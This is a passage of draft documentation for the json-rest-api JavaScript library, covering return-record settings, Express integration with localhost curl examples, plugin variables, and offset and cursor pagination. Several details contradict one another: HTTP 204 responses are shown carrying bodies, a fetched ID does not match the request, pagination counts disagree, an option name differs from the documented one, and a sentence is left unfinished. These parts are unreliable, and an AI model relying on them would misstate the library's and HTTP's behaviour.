**Important**: The resource-level configuration supports separate settings for API and transport modes, allowing you to have different behaviors for programmatic calls versus HTTP endpoints for the same resource.

**Special case**: When passing attributes directly (without `inputRecord`), simplified mode is always `true` regardless of configuration:
```javascript
// This ALWAYS uses simplified mode, even if global/resource setting is false
const result = await api.resources.countries.post({
  name: 'United States',
  code: 'US'
});
```

By default, `simplifiedApi` is `true` for programmatic usage, making it easier to work with the API in your code while still maintaining full JSON:API compliance internally.

#### API usage and returning records

When performing write operations (POST, PUT, PATCH), you can control what data is returned. This is useful for balancing between getting complete data and optimizing performance.

There are TWO separate settings for this:

1. **`returnRecordApi`** - Controls what **programmatic API calls** return (default: `'full'`)
2. **`returnRecordTransport`** - Controls what **HTTP/REST endpoints** return (default: `'no'`)

This separation allows you to have different behaviors for internal API usage versus external HTTP clients. For example, your internal code might want full records for convenience, while HTTP clients might prefer minimal responses for performance.

Both settings accept three string values:
- **`'full'`**: Returns the complete record with all attributes, relationships, computed fields, and links
- **`'minimal'`**: Returns only the resource type and ID
- **`'no'`**: Returns nothing (undefined in programmatic calls, 204 No Content in HTTP)

Here's how these settings work:

```javascript
// Example 1: Using defaults
const api = new Api({ name: 'api' });
await api.use(RestApiPlugin); 
// Default: returnRecordApi='full', returnRecordTransport='no'

// Programmatic API call returns full record by default
const country = await api.resources.countries.post({
  name: 'Canada',
  code: 'CA'
});
console.log('API result:', country);
// Expected Output:
// API result: { id: '1', name: 'Canada', code: 'CA' }

// But the same operation via HTTP returns 204 No Content by default
// POST /api/countries -> 204 No Content (no body)

// Example 2: Different settings for API and Transport
await api.use(RestApiPlugin, {
  returnRecordApi: 'minimal',      // API calls return minimal
  returnRecordTransport: 'full'    // HTTP calls return full
});

// API call returns minimal
const apiResult = await api.resources.countries.post({
  name: 'Mexico',
  code: 'MX'
});
console.log('API result:', apiResult);
// Expected Output:
// API result: { id: '2', type: 'countries' }

// HTTP call returns full record
// POST /api/countries -> 204 No Content
// Body: { data: { type: 'countries', id: '3', attributes: { name: 'Mexico', code: 'MX' } } }

// Example 3: Per-method configuration
await api.use(RestApiPlugin, {
  returnRecordApi: {
    post: 'full',     // API POST returns full
    put: 'minimal',   // API PUT returns minimal
    patch: 'no'       // API PATCH returns nothing
  },
  returnRecordTransport: {
    post: 'minimal',  // HTTP POST returns minimal
    put: 'no',        // HTTP PUT returns 204
    patch: 'full'     // HTTP PATCH returns full
  }
});
```

When combined with non-simplified mode, the difference is even more apparent:

```javascript
// Non-simplified mode with full record
const fullJsonApi = await api.resources.countries.post({
  inputRecord: {
    data: {
      type: 'countries',
      attributes: { name: 'France', code: 'FR' }
    }
  },
  simplified: false
});
console.log('Full JSON:API response:', inspect(fullJsonApi));
// Expected Output:
// Full JSON:API response: {
//   data: {
//     type: 'countries',
//     id: '4',
//     attributes: { name: 'France', code: 'FR' },
//     links: { self: '/api/countries/4' }
//   },
//   links: { self: '/api/countries/4' }
// }

// Non-simplified mode with minimal return
const minimalJsonApi = await api.resources.countries.post({
  inputRecord: {
    data: {
      type: 'countries',
      attributes: { name: 'Germany', code: 'DE' }
    }
  },
  simplified: false
});
console.log('Minimal JSON:API response:', inspect(minimalJsonApi));
// Expected Output:
// Minimal JSON:API response: { id: '5', type: 'countries' }
```

**Configuration Levels**: Both `returnRecordApi` and `returnRecordTransport` can be configured at multiple levels, with the hierarchy being: per-call → per-resource → global default.

**Important**: Like the simplified settings, the resource-level configuration supports separate settings for API and transport modes, allowing fine-grained control over what data is returned for programmatic calls versus HTTP endpoints.

For example:

1. **Global default**: Set during plugin installation
   ```javascript
   await api.use(RestApiPlugin, {
     returnRecordApi: {
       post: 'full',      // API POST returns full
       put: 'minimal',    // API PUT returns minimal
       patch: 'full'      // API PATCH returns full
     },
     returnRecordTransport: {
       post: 'minimal',   // HTTP POST returns minimal
       put: 'no',         // HTTP PUT returns 204
       patch: 'minimal'   // HTTP PATCH returns minimal
     }
   });
   ```

2. **Per-resource override**: Set when defining a resource
   ```javascript
   await api.addResource('countries', {
     schema: {
       name: { type: 'string', required: true },
       code: { type: 'string', required: true }
     },
     returnRecordApi: 'full',        // All API methods return full
     returnRecordTransport: 'minimal' // All HTTP methods return minimal
   });
   
   // Or with per-method granularity:
   await api.addResource('products', {
     schema: {
       name: { type: 'string', required: true },
       price: { type: 'number', required: true }
     },
     returnRecordApi: {
       post: 'full',     // API POST returns full record
       put: 'minimal',   // API PUT returns minimal
       patch: 'no'       // API PATCH returns nothing
     },
     returnRecordTransport: {
       post: 'minimal',  // HTTP POST returns minimal
       put: 'no',        // HTTP PUT returns 204
       patch: 'full'     // HTTP PATCH returns full record
     }
   });
   ```

3. **Per-call override**: Set in individual method calls
   ```javascript
   // Override for a specific API call
   const result = await api.resources.countries.patch({
     inputRecord: {
       id: '1',
       name: 'United States of America'
     },
     returnFullRecord: 'minimal'  // Overrides the configured setting
   });
   // result = { id: '1', type: 'countries' }
   ```

**Performance consideration**: When using `'full'`, the API performs an additional GET request internally after the write operation to fetch the complete record with all computed fields and relationships. Using `'minimal'` or `'no'` skips this extra query, improving performance when you don't need the full data.

**Remember the defaults**:
- `returnRecordApi` defaults to `'full'` (convenient for development)
- `returnRecordTransport` defaults to `'no'` (optimal for performance)

### REST Usage (HTTP Endpoints)

Since this is a REST API, its main purpose is to be used with a REST interface over HTTP.
To expose your API resources via HTTP, you need to install one of the connector plugins:

* **`ExpressPlugin`**: If you are using `Express.js` in your application.

* **`(Coming soon)`**: Fastify and Koa are planned and coming soon

Thanks to the ExpressPlugin, `json-rest-api` is able to export an Express router that you can just `use()` in Express.

Just modify the example above so that it looks like this:

```javascript
import { RestApiPlugin, RestApiKnexPlugin, ExpressPlugin } from 'json-rest-api'; // Added: ExpressPlugin
import { Api } from 'hooked-api';
import knexLib from 'knex';
import util from 'util';
import express from 'express'; // Added: Express

// Utility used throughout this guide
const inspect = (obj) => util.inspect(obj, { depth: 5 })

// Create a Knex instance connected to SQLite in-memory database
const knex = knexLib({
  client: 'better-sqlite3',
  connection: {
    filename: ':memory:'
  },
  useNullAsDefault: true
});

// Create API instance
const api = new Api({ name: 'book-catalog-api' });

// Install plugins
await api.use(RestApiPlugin); // URLs auto-detected
await api.use(RestApiKnexPlugin, { knex });
await api.use(ExpressPlugin, {  mountPath: '/api' }); // Added: Express Plugin

// Countries table
await api.addResource('countries', {
  schema: {
    name: { type: 'string', required: true, max: 100, search: true },
    code: { type: 'string', max: 2, unique: true, search: true }, // ISO country code
  }
});
await api.resources.countries.createKnexTable()

/// *** ...programmatic calls here... ***

// Create the express server and add the API's routes 
const app = express();
app.use(api.http.express.router);
app.use(api.http.express.notFoundRouter);

app.listen(3000, () => {
  console.log('Express server started on port 3000. API available at http://localhost:3000/api');
}).on('error', (err) => {
  console.error('Failed to start server:', err);
  process.exit(1)
});

// Close the database connection // no longer happening since the server stays on
// await knex.destroy();
// console.log('\n✅ All schemas created successfully!');
// console.log('Database connection closed.');
```

Since you added `express`, you will need to install it:

```bash
npm install express
```

Note how the `HttpPlugin` doesn't actually add any routes to the server. All it does, is expose `api.http.express.router` which is a 

Once the server is running, you can interact with your API using tools like `curl`.

**REST Example: Create a Country**

```bash
curl -i -X POST -H "Content-Type: application/vnd.api+json" \
-d '{
  "data": {
    "type": "countries",
    "attributes": {
      "name": "United Kingdom",
      "code": "UK"
    }
  }
}' http://localhost:3000/api/countries
```

This will have no response (204 No Content) since by default resources won't return anything when using HTTP:

```
HTTP/1.1 204 No Content
X-Powered-By: Express
Location: http://localhost:3000/api/countries/1
ETag: W/"a-bAsFyilMr4Ra1hIU5PyoyFRunpI"
Date: Tue, 22 Jul 2025 14:54:45 GMT
Connection: keep-alive
Keep-Alive: timeout=5
```

**REST Example: Get a Country by ID**

```bash
curl -X GET http://localhost:3000/api/countries/2
```

The result:

```json
{
  "data": {
    "type": "countries",
    "id": "1",
    "attributes": {
      "name": "United Kingdom",
      "code": "UK"
    },
    "links": {
      "self": "http://localhost:3000/api/countries/1"
    }
  },
  "links": {
    "self": "http://localhost:3000/api/countries/1"
  }
}
```

### Simplified Mode

The simplified mode concept works exactly the same way over HTTP as it does for programmatic API calls (see "API usage and simplified mode" above). However, there's an important difference in the defaults:

- **Programmatic API**: `simplifiedApi` defaults to `true` (convenient for developers)
- **HTTP/REST**: `simplifiedTransport` defaults to `false` (JSON:API compliance)

This means that by default, HTTP endpoints expect and return proper JSON:API format:

Most production servers will keep `simplifiedTransport: false` to maintain JSON:API compliance for client applications. You can enable simplified mode for HTTP if needed:

```javascript
await api.use(RestApiPlugin, {
  simplifiedTransport: true  // Enable simplified mode for HTTP (not recommended)
});
```

The result:

```json
{
  "id":"1",
  "name":"United Kingdom",
  "code":"UK"
}
```

Keep in mind that to get this result you will need to:

1) Amend your test file, adding `simplifiedTransport: true` to the RestApiPlugin
2) Restart your server (CTRL-C and re-run it)
3) Re-add a country with the POST Curl command shown earlier
4) Finally, re-fetch it and see the record in simplified form.

Once again, it will be uncommon to use the simplified version for the HTTP transport, but it can be used to satisfy legacy clients etc.

### Return Record Settings for HTTP

The `returnRecordTransport` setting controls what HTTP/REST endpoints return (see "API usage and returning records" above for full details). The HTTP status codes vary based on the operation and setting:

**POST operations:**
- `returnRecordTransport: 'full'` → Returns `204 No Content` with the full record in the body
- `returnRecordTransport: 'minimal'` → Returns `204 No Content` with minimal response `{ id: '...', type: '...' }`
- `returnRecordTransport: 'no'` → Returns `204 No Content` with no body

**PUT/PATCH operations:**
- `returnRecordTransport: 'full'` → Returns `204 No Content` with the full record in the body
- `returnRecordTransport: 'minimal'` → Returns `204 No Content` with minimal response `{ id: '...', type: '...' }`
- `returnRecordTransport: 'no'` → Returns `204 No Content` with no body

**DELETE operations:**
- Always returns `204 No Content` with no body (regardless of settings)

**Remember**: The default for `returnRecordTransport` is `'no'`, which means HTTP write operations return 204 No Content by default. This is different from programmatic API calls which default to returning full records.

# A practical example

If you want your server to reply with a full record, you can set it this way:

```javascript
await api.use(RestApiPlugin, {
  returnRecordTransport: 'full'
});
```

Restart once again the server. Then add a country using cUrl:

```bash
curl -i -X POST -H "Content-Type: application/vnd.api+json" \
-d '{
  "data": {
    "type": "countries",
    "attributes": {
      "name": "United Kingdom",
      "code": "UK"
    }
  }
}' http://localhost:3000/api/countries
```
The result:

```
HTTP/1.1 204 No Content
X-Powered-By: Express
Content-Type: application/vnd.api+json; charset=utf-8
Location: http://localhost:3000/api/countries/1
Content-Length: 203
ETag: W/"cb-ycYSy+lmxv51HwwBAEPFd465J8M"
Date: Tue, 22 Jul 2025 15:14:13 GMT
Connection: keep-alive
Keep-Alive: timeout=5

{
  "data": {
    "type": "countries",
    "id": "1",
    "attributes": {
      "name": "United Kingdom",
      "code": "UK"
    },
    "links": {
      "self": "http://localhost:3000/api/countries/1"
    }
  },
  "links": {
    "self": "http://localhost:3000/api/countries/1"
  }
}
```

# Plugin and resource variables

When passing a parameter, `rest-api-plugin` normalises them (when needed) and stores them into plugin variables. This means that these two ways of defining `returnRecordApi` is identical:

```javascript
await api.use(RestApiPlugin, { returnRecordTransport: 'minimal' }); // URLs auto-detected

// ...or...

await api.use(RestApiPlugin, { 

  vars: {
    returnRecordTransport: 'minimal'
  }
});
```

Here is a full list of parameters and their respective variables:

| Parameter | Variable Name | Default Value | Description | Scope Override |
|-----------|--------------|---------------|-------------|----------------|
| `queryDefaultLimit` | `vars.queryDefaultLimit` | `25` | Default number of records returned in query results | ✓ |
| `queryMaxLimit` | `vars.queryMaxLimit` | `100` | Maximum allowed limit for query results | ✓ |
| `includeDepthLimit` | `vars.includeDepthLimit` | `3` | Maximum depth for nested relationship includes | ✓ |
| `enablePaginationCounts` | `vars.enablePaginationCounts` | `true` | Whether to include total count in pagination metadata | ✓ |
| `simplifiedApi` | `vars.simplifiedApi` | `true` | Use simplified format for programmatic API calls | ✓ |
| `simplifiedTransport` | `vars.simplifiedTransport` | `false` | Use simplified format for HTTP/REST endpoints | ✓ |
| `idProperty` | `vars.idProperty` | `'id'` | Name of the ID field in resources | ✓ |
| `returnRecordApi` | `vars.returnRecordApi` | `{ post: 'full', put: 'full', patch: 'full' }` | What to return for programmatic API write operations | ✓ |
| `returnRecordTransport` | `vars.returnRecordTransport` | `{ post: 'no', put: 'no', patch: 'no' }` | What to return for HTTP/REST write operations | ✓ |

**Resource-specific parameters** (only available at resource level, not plugin level):

| Parameter | Variable Name | Default Value | Description |
|-----------|--------------|---------------|-------------|
| `sortableFields` | `vars.sortableFields` | `[]` | Array of field names that can be used for sorting |
| `defaultSort` | `vars.defaultSort` | `null` | Default sort order for queries (e.g., `['-createdAt', 'name']`) |

**Notes:**
- "Scope Override" indicates whether the parameter can be overridden at the resource (scope) level
- `returnRecordApi` and `returnRecordTransport` can be either:
  - A string: `'no'`, `'minimal'`, or `'full'` (applies to all methods)
  - An object: `{ post: 'full', put: 'minimal', patch: 'no' }` (per-method configuration)
- All parameters support the cascade: per-call → resource-level → plugin-level default

# Custom ID parameter

TODO: Explain how idParam works, clarify that for the api it's always 'id' and there is no ID in the attributes

# Helpers and Methods Provided by REST API Plugins

The REST API plugins extend your API instance with various helpers and methods at different levels. Here's what becomes available:

## API-Level Helpers

When you install the REST API plugins, the following helpers are added to `api.helpers`:

### From RestApiPlugin

- **`api.helpers.getLocation(scopeName, id)`** - Generates the full URL for a resource
  ```javascript
  const url = api.helpers.getLocation('countries', '1');
  // Returns: 'http://localhost:3000/api/countries/1'
  ```

- **`api.helpers.getUrlPrefix(scope, context)`** - Gets the URL prefix for generating links
  ```javascript
  const prefix = api.helpers.getUrlPrefix(scope, context);
  // Returns: 'http://localhost:3000/api'
  ```

### From RestApiKnexPlugin

- **`api.helpers.newTransaction()`** - Creates a new database transaction for atomic operations
  ```javascript
  const trx = await api.helpers.newTransaction();
  try {
    // Use transaction in multiple operations
    await api.resources.countries.post({ name: 'France', code: 'FR' }, { transaction: trx });
    await api.resources.publishers.post({ name: 'French Press', country_id: 1 }, { transaction: trx });
    await trx.commit();
  } catch (error) {
    await trx.rollback();
    throw error;
  }
  ```

## API Namespaces

The plugins also create organized namespaces on the API instance:

### `api.knex` Namespace (from RestApiKnexPlugin)

- **`api.knex.instance`** - Direct access to the Knex database instance
  ```javascript
  // Run raw queries when needed
  const result = await api.knex.instance.raw('SELECT COUNT(*) FROM countries');
  ```

- **`api.knex.capabilities`** - Information about database capabilities
  ```javascript
  console.log(api.knex.capabilities);
  // { windowFunctions: true, dbInfo: { client: 'sqlite3', version: '3.36.0' } }
  ```

### `api.http` Namespace (from connector plugins)

When using ExpressPlugin:

- **`api.http.express.router`** - The Express router containing all API endpoints
- **`api.http.express.notFoundRouter`** - Express middleware for handling 404 errors

```javascript
// In your Express app
app.use(api.http.express.router);
app.use(api.http.express.notFoundRouter);
```

## Resource-Level Methods

Each resource (added via `api.addResource()`) gets these methods automatically:

### CRUD Operations

- **`api.resources.{resourceName}.query(params)`** - List resources with filtering, sorting, pagination
  ```javascript
  const countries = await api.resources.countries.query({
    queryParams: {
      filters: { name: 'United' },
      sort: ['name'],
      page: { size: 10, number: 1 }
    }
  });
  ```

- **`api.resources.{resourceName}.get(params)`** - Retrieve a single resource by ID
  ```javascript
  const country = await api.resources.countries.get({ id: '1' });
  ```

- **`api.resources.{resourceName}.post(params)`** - Create a new resource
  ```javascript
  const newCountry = await api.resources.countries.post({
    name: 'Canada',
    code: 'CA'
  });
  ```

- **`api.resources.{resourceName}.put(params)`** - Replace an entire resource
  ```javascript
  const updated = await api.resources.countries.put({
    id: '1',
    name: 'United States of America',
    code: 'USA'
  });
  ```

- **`api.resources.{resourceName}.patch(params)`** - Partially update a resource
  ```javascript
  const patched = await api.resources.countries.patch({
    id: '1',
    name: 'USA'
  });
  ```

- **`api.resources.{resourceName}.delete(params)`** - Delete a resource
  ```javascript
  await api.resources.countries.delete({ id: '1' });
  ```

### Database Operations

- **`api.resources.{resourceName}.createKnexTable()`** - Creates the database table for this resource
  ```javascript
  // Create the table based on the schema definition
  await api.resources.countries.createKnexTable();
  ```


## API Namespaces (internal, for plugin developers)

### `api.rest` Namespace (from RestApiPlugin)

- **`api.rest.registerFileDetector(detector)`** - Registers file upload detectors (requires FileHandlingPlugin)
- **`api.rest.fileDetectors`** - Registry of file detectors for handling uploads

## Summary

These helpers and methods provide a complete toolkit for:
- Building RESTful APIs with full CRUD support
- Managing database transactions
- Generating proper URLs and links
- Accessing the underlying database when needed
- Integrating with web frameworks like Express

The architecture ensures clean separation between HTTP transport, business logic, and data persistence layers.# 2.7 Pagination and ordering

Pagination and ordering are essential features for working with large datasets. The json-rest-api library provides powerful pagination that applies not just to main resources, but also to included relationships. This means you can limit and order both parent records AND their children independently.

Let's create a comprehensive example with posts, comments, and tags to demonstrate all pagination and ordering features:

```javascript
await api.addResource('posts', {
  schema: {
    title: { type: 'string', required: true, max: 255, search: true, filterOperator: 'like', indexed: true },
    content: { type: 'string', required: true },
    view_count: { type: 'number', default: 0, indexed: true },
    published_at: { type: 'dateTime', indexed: true },
    created_at: { type: 'dateTime', defaultTo: Date.now, indexed: true }
  },
  relationships: {
    comments: { 
      hasMany: 'comments', 
      foreignKey: 'post_id',
      include: {
        limit: 5,  // Default limit for included comments
        orderBy: ['-created_at']  // Newest comments first
      }
    },
    tags: {
      hasMany: 'tags',
      through: 'post_tags',
      foreignKey: 'post_id',
      otherKey: 'tag_id',
      include: {
        limit: 10,
        orderBy: ['name']  // Alphabetical order
      }
    }
  },
  // Define which fields can be sorted in queries
  sortableFields: ['title', 'view_count', 'published_at', 'created_at'],
  // Default sort uses the same format as query sort parameters:
  // - String format: '-created_at' (- prefix for DESC)
  // - Array format: ['-created_at', 'title'] for multiple sorts
  defaultSort: '-created_at',  // Newest first by default
  
  // Set pagination limits for this resource
  queryDefaultLimit: 10,  // Default page size
  queryMaxLimit: 50      // Maximum allowed page size
});
await api.resources.posts.createKnexTable();

// Define comments resource
await api.addResource('comments', {
  schema: {
    content: { type: 'string', required: true },
    author_name: { type: 'string', required: true, max: 100 },
    created_at: { type: 'dateTime', defaultTo: Date.now, indexed: true },
    likes: { type: 'number', default: 0, indexed: true },
    post_id: { type: 'id', belongsTo: 'posts', as: 'post', required: true }
  },
  sortableFields: ['created_at', 'likes'],
  queryDefaultLimit: 20,
  queryMaxLimit: 100
});
await api.resources.comments.createKnexTable();

// Define tags resource
await api.addResource('tags', {
  schema: {
    name: { type: 'string', required: true, max: 50, unique: true, indexed: true },
    usage_count: { type: 'number', default: 0, indexed: true }
  },
  relationships: {
    posts: {
      hasMany: 'posts',
      through: 'post_tags',
      foreignKey: 'tag_id',
      otherKey: 'post_id'
    }
  },
  sortableFields: ['name', 'usage_count'],
  queryDefaultLimit: 30
});
await api.resources.tags.createKnexTable();

// Define pivot table
await api.addResource('post_tags', {
  schema: {
    post_id: { type: 'id', belongsTo: 'posts', as: 'post', required: true },
    tag_id: { type: 'id', belongsTo: 'tags', as: 'tag', required: true }
  }
});
await api.resources.post_tags.createKnexTable();

```

**Basic Pagination**

The API supports two types of pagination:

1. **Offset-based pagination** using `page[number]` and `page[size]` parameters
2. **Cursor-based pagination** using `page[after]` and `page[before]` parameters

**How the API chooses pagination mode:**

The API automatically selects the pagination mode based on your query parameters:
- When you specify a page number (`page[number]=2`), you get traditional offset pagination with page counts and totals
- When you only specify a page size (`page[size]=10`) without a page number, the API switches to cursor pagination for better performance
- When you use cursor parameters (`page[after]` or `page[before]`), you explicitly request cursor pagination

This design encourages the use of cursor pagination (which is more efficient for large datasets) while still supporting traditional page numbers when needed.

**Offset-based Pagination:**

```javascript
// Get first page with default size (10 posts)
const page1 = await api.resources.posts.query({
  queryParams: { 
    page: { number: 1, size: 5 }
  }
});
// HTTP: GET /api/posts?page[number]=1
// Returns: {
//   data: [ /* 10 posts */ ],
//   meta: {
//     pagination: {
//       page: 1,
//       pageSize: 5,
//       pageCount: 3,
//       total: 25
//     }
//   }
// }

// Get second page with custom size
const page2 = await api.resources.posts.query({
  queryParams: { 
    page: { number: 2, size: 5 }
  }
});
// HTTP: GET /api/posts?page[number]=2&page[size]=5
// Returns: {
//   data: [ /* 5 posts (posts 6-10) */ ],
//   meta: {
//     pagination: {
//       page: 2,
//       pageSize: 5,
//       pageCount: 5,
//       total: 25
//     }
//   }
// }

// Get a large page (but limited by queryMaxLimit)
const largePage = await api.resources.posts.query({
  queryParams: { 
    page: { number: 1, size: 100 }  // Will be capped at 50 (queryMaxLimit)
  }
});
// HTTP: GET /api/posts?page[number]=1&page[size]=100
// Returns: {
//   data: [ /* All 25 posts */ ],
//   meta: {
//     pagination: {
//       page: 1,
//       pageSize: 50,  // Capped at queryMaxLimit
//       pageCount: 1,
//       total: 25
//     }
//   }
// }

console.log('Page 1 posts:', page1.data.length);
console.log('Page 1 post data:', page1.data);
console.log('Page 2 posts:', page2.data.length);
console.log('Page 2 post data:', page2.data);
console.log('Large page posts:', largePage.data.length);
console.log('Page 1 metadata:', page1.meta);
```

**Expected Output**

```text
Page 1 posts: 5
Page 1 post data: [
  {
    id: '25',
    title: 'Post 25: Odd Number Post',
    content: "This is the content of post number 25. It's a odd numbered post.",
    view_count: 823,
    published_at: 2025-07-28T03:57:39.711Z,
    created_at: 2025-07-28T03:57:39.712Z,
    comments_ids: [],
    tags_ids: [ '1', '2', '3', '4', '5' ]
  },
  {
    id: '24',
    title: 'Post 24: Even Number Post',
    content: "This is the content of post number 24. It's a even numbered post.",
    view_count: 765,
    published_at: 2025-07-27T03:57:39.707Z,
    created_at: 2025-07-28T03:57:39.708Z,
    comments_ids: [],
    tags_ids: [ '1', '2', '3', '4', '5' ]
  },
  {
    id: '23',
    title: 'Post 23: Odd Number Post',
    content: "This is the content of post number 23. It's a odd numbered post.",
    view_count: 196,
    published_at: 2025-07-26T03:57:39.705Z,
    created_at: 2025-07-28T03:57:39.706Z,
    comments_ids: [],
    tags_ids: [ '1', '2', '3' ]
  },
  {
    id: '22',
    title: 'Post 22: Even Number Post',
    content: "This is the content of post number 22. It's a even numbered post.",
    view_count: 987,
    published_at: 2025-07-25T03:57:39.703Z,
    created_at: 2025-07-28T03:57:39.703Z,
    comments_ids: [],
    tags_ids: [ '1', '2', '3' ]
  },
  {
    id: '21',
    title: 'Post 21: Odd Number Post',
    content: "This is the content of post number 21. It's a odd numbered post.",
    view_count: 28,
    published_at: 2025-07-24T03:57:39.701Z,
    created_at: 2025-07-28T03:57:39.701Z,
    comments_ids: [],
    tags_ids: [ '1', '2', '3' ]
  }
]
Page 2 posts: 5
Page 2 post data: [
  {
    id: '20',
    title: 'Post 20: Even Number Post',
    content: "This is the content of post number 20. It's a even numbered post.",
    view_count: 626,
    published_at: 2025-07-23T03:57:39.699Z,
    created_at: 2025-07-28T03:57:39.699Z,
    comments_ids: [],
    tags_ids: [ '1', '2', '3' ]
  },
  {
    id: '19',
    title: 'Post 19: Odd Number Post',
    content: "This is the content of post number 19. It's a odd numbered post.",
    view_count: 487,
    published_at: 2025-07-22T03:57:39.696Z,
    created_at: 2025-07-28T03:57:39.697Z,
    comments_ids: [],
    tags_ids: [ '1', '2', '3', '4' ]
  },
  {
    id: '18',
    title: 'Post 18: Even Number Post',
    content: "This is the content of post number 18. It's a even numbered post.",
    view_count: 685,
    published_at: 2025-07-21T03:57:39.694Z,
    created_at: 2025-07-28T03:57:39.695Z,
    comments_ids: [],
    tags_ids: [ '1', '2', '3' ]
  },
  {
    id: '17',
    title: 'Post 17: Odd Number Post',
    content: "This is the content of post number 17. It's a odd numbered post.",
    view_count: 402,
    published_at: 2025-07-20T03:57:39.690Z,
    created_at: 2025-07-28T03:57:39.691Z,
    comments_ids: [],
    tags_ids: [ '1', '2', '3', '4', '5' ]
  },
  {
    id: '16',
    title: 'Post 16: Even Number Post',
    content: "This is the content of post number 16. It's a even numbered post.",
    view_count: 705,
    published_at: 2025-07-19T03:57:39.685Z,
    created_at: 2025-07-28T03:57:39.686Z,
    comments_ids: [],
    tags_ids: [ '1', '2', '3', '4', '5' ]
  }
]
Large page posts: 25
Page 1 metadata: {
  pagination: { page: 1, pageSize: 5, pageCount: 5, total: 25, hasMore: true }
}
```

**Cursor-based Pagination:**

Cursor-based pagination is ideal for real-time data or when users are scrolling through results. It provides stable pagination even when new records are added:

```javascript
// Get first page of posts (newest first)
const firstPage = await api.resources.posts.query({
  queryParams: {
    page: { size: 5 },  // Using size without number triggers cursor pagination
    sort: ['-created_at']
  }
});
// Returns: {
//   data: [ /* 5 posts */ ],
//   meta: {
//     pagination: {
//       pageSize: 5,
//       hasMore: true,
//       cursor: { next: 'created_at:2024-07-25T10%3A30%3A00.000Z' }
//     }
//   }
// }

// Get next page using the cursor from meta
const nextPage = await api.resources.posts.query({
  queryParams: {
    page: { 
      size: 5,
      after: firstPage.meta.pagination.cursor.next 
    },
    sort: ['-created_at']
  }
});

// Get second page using the cursor from first page
const secondPage = await api.resources.posts.query({
  queryParams: {
    page: { 
      size: 5,
      after: firstPage.meta.pagination.cursor?.next 
    },
    sort: ['-created_at']
  }
});

// For backward pagination (less common), use the 'prev' cursor
// Note: This requires the implementation to provide prev cursors
if (secondPage.meta.pagination.cursor?.prev) {
  const backToFirstPage = await api.resources.posts.query({
    queryParams: {
      page: { 
        size: 5,
        before: secondPage.meta.pagination.cursor.prev 
      },
      sort: ['-created_at']
    }
  });
}

console.log('First page:', inspect(firstPage));
console.log('\nSecond page:', inspect(secondPage));
```

**Expected output**

```
First page: {
  data: [
    {
      id: '25',
      title: 'Post 25: Odd Number Post',
      content: "This is the content of post number 25. It's a odd numbered post.",
      view_count: 142,
      published_at: 2025-07-28T04:06:39.821Z,
      created_at: 2025-07-28T04:06:39.821Z,
      comments_ids: [],
      tags_ids: [ '1', '2', '3', '4' ]
    },
    {
      id: '24',
      title: 'Post 24: Even Number Post',
      content: "This is the content of post number 24. It's a even numbered post.",
      view_count: 497,
      published_at: 2025-07-27T04:06:39.818Z,
      created_at: 2025-07-28T04:06:39.818Z,
      comments_ids: [],
      tags_ids: [ '1', '2', '3', '4', '5' ]
    },
    {
      id: '23',
      title: 'Post 23: Odd Number Post',
      content: "This is the content of post number 23. It's a odd numbered post.",
      view_count: 167,
      published_at: 2025-07-26T04:06:39.815Z,
      created_at: 2025-07-28T04:06:39.816Z,
      comments_ids: [],
      tags_ids: [ '1', '2', '3', '4', '5' ]
    },
    {
      id: '22',
      title: 'Post 22: Even Number Post',
      content: "This is the content of post number 22. It's a even numbered post.",
      view_count: 738,
      published_at: 2025-07-25T04:06:39.813Z,
      created_at: 2025-07-28T04:06:39.813Z,
      comments_ids: [],
      tags_ids: [ '1', '2', '3' ]
    },
    {
      id: '21',
      title: 'Post 21: Odd Number Post',
      content: "This is the content of post number 21. It's a odd numbered post.",
      view_count: 41,
      published_at: 2025-07-24T04:06:39.810Z,
      created_at: 2025-07-28T04:06:39.811Z,
      comments_ids: [],
      tags_ids: [ '1', '2', '3' ]
    }
  ],
  meta: {
    pagination: {
      pageSize: 5,
      hasMore: true,
      cursor: { next: 'created_at:1753675599811' }
    }
  },
  links: {
    self: '/api/posts?sort=-created_at&&&page[size]=5',
    first: '/api/posts?sort=-created_at&&&page[size]=5',
    next: '/api/posts?sort=-created_at&&&page[size]=5&page[after]=created_at:1753675599811'
  }
}

Second page: {
  data: [
    {
      id: '20',
      title: 'Post 20: Even Number Post',
      content: "This is the content of post number 20. It's a even numbered post.",
      view_count: 149,
      published_at: 2025-07-23T04:06:39.808Z,
      created_at: 2025-07-28T04:06:39.809Z,
      comments_ids: [],
      tags_ids: [ '1', '2', '3', '4' ]
    },
    {
      id: '19',
      title: 'Post 19: Odd Number Post',
      content: "This is the content of post number 19. It's a odd numbered post.",
      view_count: 562,
      published_at: 2025-07-22T04:06:39.805Z,
      created_at: 2025-07-28T04:06:39.806Z,
      comments_ids: [],
      tags_ids: [ '1', '2', '3', '4', '5' ]
    },
    {
      id: '18',
      title: 'Post 18: Even Number Post',
      content: "This is the content of post number 18. It's a even numbered post.",
      view_count: 146,
      published_at: 2025-07-21T04:06:39.803Z,
      created_at: 2025-07-28T04:06:39.803Z,
      comments_ids: [],
      tags_ids: [ '1', '2', '3' ]
    },
    {
      id: '17',
      title: 'Post 17: Odd Number Post',
      content: "This is the content of post number 17. It's a odd numbered post.",
      view_count: 689,
      published_at: 2025-07-20T04:06:39.798Z,
      created_at: 2025-07-28T04:06:39.799Z,
      comments_ids: [],
      tags_ids: [ '1', '2', '3', '4' ]
    },
    {
      id: '16',
      title: 'Post 16: Even Number Post',
      content: "This is the content of post number 16. It's a even numbered post.",
      view_count: 215,
      published_at: 2025-07-19T04:06:39.796Z,
      created_at: 2025-07-28T04:06:39.797Z,
      comments_ids: [],
      tags_ids: [ '1', '2', '3' ]
    }
  ],
  meta: {
    pagination: {
      pageSize: 5,
      hasMore: true,
      cursor: { next: 'created_at:1753675599797' }
    }
  },
  links: {
    self: '/api/posts?sort=-created_at&&&page[size]=5&page[after]=created_at:1753675599811',
    first: '/api/posts?sort=-created_at&&&page[size]=5',
    next: '/api/posts?sort=-created_at&&&page[size]=5&page[after]=created_at:1753675599797'
  }
}
```

When sorting happens 

```javascript
// Multi-field cursor pagination example
const multiFieldPage = await api.resources.posts.query({
  queryParams: {
    page: { size: 5 },
    sort: ['view_count', '-created_at']  // Sort by view_count first, then by created_at DESC
  }
});

// The cursor will contain both fields: "view_count:142,created_at:2024-07-25T10%3A30%3A00.000Z"
// This ensures no records are skipped even if many posts have the same view_count
const nextMultiFieldPage = await api.resources.posts.query({
  queryParams: {
    page: { 
      size: 5,
      after: multiFieldPage.meta.pagination.cursor.next 
    },
    sort: ['view_count', '-created_at']
  }
});

console.log('First multiField page:', inspect(multiFieldPage));
